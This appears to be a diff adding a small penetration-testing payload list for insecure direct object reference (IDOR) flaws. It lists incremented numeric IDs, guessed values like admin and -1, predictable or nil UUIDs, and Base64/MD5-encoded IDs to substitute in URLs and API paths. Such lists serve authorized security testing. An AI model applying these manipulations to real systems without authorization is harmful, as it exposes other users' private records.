@@ -1,0 +1,20 @@
+# Basic IDOR Parameter Manipulation
+
+# Numeric ID Incrementing
+?id=123 -> ?id=124
+?user_id=1001 -> ?user_id=1002
+/api/v1/users/123 -> /api/v1/users/124
+
+# Mapping / Guessing
+?id=admin
+?id=root
+?id=0
+?id=-1
+
+# UUID / GUID Patterns (Check for predictability)
+/api/user/550e8400-e29b-41d4-a716-446655440000
+/api/user/00000000-0000-0000-0000-000000000000
+
+# Hash Conversion (MD5/Base64 of IDs)
+?id=MQ== (Base64 for 1)
+?id=c4ca4238a0b923820dcc509a6f75849b (MD5 for 1)
